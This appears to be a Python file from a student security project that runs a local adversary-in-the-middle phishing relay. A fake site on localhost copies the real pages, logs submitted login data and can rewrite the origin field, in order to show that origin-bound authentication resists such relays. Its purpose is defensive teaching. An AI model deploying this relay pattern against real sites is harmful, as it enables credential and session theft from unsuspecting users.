"""
ZeroPhish phishing-site simulator  (Person 2: Apeksha)  -  Objective 2

A FAKE website at http://localhost:5001 that looks identical to the real one
(it serves the very same client files) and secretly passes everything through to
the real server. This is called a "relay" or "adversary-in-the-middle" attack.
Real tools such as Evilginx work this way.

Thief analogy: a fake hotel front desk. Guests hand over their signed slip, the thief
walks it to the REAL desk and tries to use it. The signature has the FAKE desk's
name written on it, so the real desk refuses.

Run (the real server must already be running on port 5000):
    python relay.py                      -> honest relay
    REWRITE_ORIGIN=1 python relay.py     -> smarter thief who lies about the address
    (Windows PowerShell:  $env:REWRITE_ORIGIN="1"; python relay.py)
"""
import logging
import os
import threading
import webbrowser

import requests
from flask import Flask, Response, redirect, request

REAL_SERVER = "http://localhost:5000"
FAKE_ORIGIN = "http://localhost:5001"
REWRITE_ORIGIN = os.environ.get("REWRITE_ORIGIN") == "1"

CLIENT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "client")

# Same pages as the real site -> the victim sees an identical-looking page.
app = Flask(__name__, static_folder=CLIENT_DIR, static_url_path="")

logging.basicConfig(level=logging.INFO, format="%(asctime)s  %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("phish")

# Everything the page talks to the server with gets relayed.
RELAYED_PATHS = ["challenge", "register", "login", "me", "action/challenge", "action/confirm"]


@app.before_request
def canonical_origin_redirect():
    if request.host.startswith("127.0.0.1:5001"):
        new_url = request.url.replace("127.0.0.1:5001", "localhost:5001", 1)
        return redirect(new_url, code=302)


@app.get("/")
def index():
    return app.send_static_file("index.html")


def shorten(value):
    text = str(value)
    return text if len(text) <= 24 else text[:24] + "..."


def relay(path):
    body = request.get_json(silent=True)
    if body is not None:
        log.info("THIEF SAW  /%s  %s", path, {k: shorten(v) for k, v in body.items()})
        if REWRITE_ORIGIN and "origin" in body:
            body["origin"] = REAL_SERVER
            log.info("THIEF LIES  changed origin to %s", REAL_SERVER)

    headers = {}
    if "Authorization" in request.headers:
        headers["Authorization"] = request.headers["Authorization"]

    reply = requests.request(request.method, f"{REAL_SERVER}/{path}", json=body, headers=headers, timeout=10)
    log.info("REAL SERVER SAID  %s  %s", reply.status_code, reply.text.strip()[:160])
    return Response(reply.content, status=reply.status_code,
                    content_type=reply.headers.get("Content-Type", "application/json"))


for _path in RELAYED_PATHS:
    app.add_url_rule("/" + _path, endpoint="relay_" + _path.replace("/", "_"),
                     view_func=lambda p=_path: relay(p), methods=["GET", "POST"])


if __name__ == "__main__":
    mode = "LYING about the origin" if REWRITE_ORIGIN else "honest relay"
    log.info("Fake site running at %s  (%s)  ->  forwarding to %s", FAKE_ORIGIN, mode, REAL_SERVER)
    threading.Timer(1.25, lambda: webbrowser.open(FAKE_ORIGIN)).start()
    app.run(host="127.0.0.1", port=5001, debug=False)
